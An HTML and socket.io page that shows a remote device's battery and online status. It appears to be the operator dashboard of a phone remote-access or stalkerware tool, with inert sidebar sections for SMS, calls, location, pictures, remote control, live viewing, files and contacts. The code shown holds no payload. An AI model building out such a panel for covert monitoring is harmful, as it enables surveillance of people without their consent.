<!DOCTYPE html>
<html>
<head>
    <title>Battery Monitor</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #000; margin: 0; display: flex; color: white; }

        /* SIDEBAR STYLING */
        .sidebar {
            width: 240px;
            height: 100vh;
            background: #111;
            border-right: 1px solid #333;
            position: fixed;
            left: 0;
            top: 0;
            padding: 20px;
            box-sizing: border-box;
            z-index: 2000;
        }

        .sidebar h2 { 
            color: #fff; 
            font-size: 1.2rem; 
            margin-bottom: 30px; 
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }

        .nav-item { 
            color: #888; 
            padding: 12px 15px; 
            cursor: pointer; 
            border-radius: 8px;
            margin-bottom: 5px;
            transition: 0.3s;
        }
        .nav-item:hover { background: #222; color: #fff; }
        .nav-item.active { background: #006400; color: #fff; }

        /* MAIN CONTENT AREA */
        .main-container {
            margin-left: 240px; /* Aligns with Sidebar width */
            width: calc(100% - 240px);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* TOP NAV (CENTERED WITHIN MAIN AREA) */
        .top-nav {
            width: 100%;
            height: 60px;
            background: #111;
            display: flex;
            justify-content: center; /* Centers the battery box */
            align-items: center;
            border-bottom: 1px solid #333;
            position: sticky;
            top: 0;
            z-index: 1000;
        }

        .status-wrapper { display: flex; align-items: center; gap: 15px; }

        /* Battery Box Styling */
        .battery-box {
            padding: 6px 20px;
            border-radius: 6px;
            font-weight: bold;
            font-size: 1.6rem;
            min-width: 85px;
            text-align: center;
            transition: all 0.4s ease;
        }

        /* Online: Dark Green Text, Light Green Box */
        .online { background-color: #90ee90; color: #006400; }
        
        /* Offline: Dark Red Text, Light Red Box */
        .offline { background-color: #ffcccb; color: #8b0000; }

        /* Symbols beside the box */
        .state-icon { font-size: 1.8rem; display: none; }
        #charging-icon { color: #f1c40f; } /* Yellow Bolt */
        #unplugged-icon { color: #2ecc71; } /* Green Battery */
        
        .page-content { padding: 40px; text-align: center; color: #555; }
    </style>
</head>
<body>

    <div class="sidebar">
        <h2>CONTROL PANEL</h2>
        <div class="nav-item active">DASHBOARD</div>
        <div class="nav-item">SMS</div>
        <div class="nav-item">CALLS</div>
        <div class="nav-item">LOCATION</div>
        <div class="nav-item">PICTURES</div>
        <div class="nav-item">SITE WEB</div>
        <div class="nav-item">REMOTE CONTROL</div>
        <div class="nav-item">LIVE VIEWING</div>
        <div class="nav-item">FILE EXPLORER</div>
        <div class="nav-item">CONTACTS</div>
    </div>

    <div class="main-container">
        <div class="top-nav">
            <div class="status-wrapper">
                <div id="bat-box" class="battery-box offline">
                    <span id="bat-pct">--</span>%
                </div>
                
                <span id="charging-icon" class="state-icon">âš¡</span>
                <span id="unplugged-icon" class="state-icon">ðŸ”‹</span>
            </div>
        </div>

        <div class="page-content">
            <h3>System Active</h3>
            <p>Percentage is centered and aligned with the sidebar.</p>
        </div>
    </div>

    <script>
        const socket = io();
        const batBox = document.getElementById('bat-box');
        const batPct = document.getElementById('bat-pct');
        const chargingIcon = document.getElementById('charging-icon');
        const unpluggedIcon = document.getElementById('unplugged-icon');

        socket.on('device-status', (status) => {
            if (status.online) {
                batBox.className = "battery-box online";
            } else {
                batBox.className = "battery-box offline";
                batPct.innerText = "--";
                chargingIcon.style.display = "none";
                unpluggedIcon.style.display = "none";
            }
        });

        socket.on('ui-battery', (data) => {
            // SMART FIX: Handle if data is just a number (85) or an object
            let finalPercent;
            let isCharging = false;

            if (typeof data === 'object' && data !== null) {
                finalPercent = data.percent;
                isCharging = data.charging;
            } else {
                finalPercent = data; // If only number 85 is received
            }

            // Update display
            batPct.innerText = finalPercent;
            batBox.className = "battery-box online";

            // Update Symbols
            if (typeof data === 'object') {
                if (isCharging) {
                    chargingIcon.style.display = "inline";
                    unpluggedIcon.style.display = "none";
                } else {
                    chargingIcon.style.display = "none";
                    unpluggedIcon.style.display = "inline";
                }
            } else {
                // Default to Battery icon if only number is sent
                chargingIcon.style.display = "none";
                unpluggedIcon.style.display = "inline";
            }
        });
    </script>
</body>
</html>
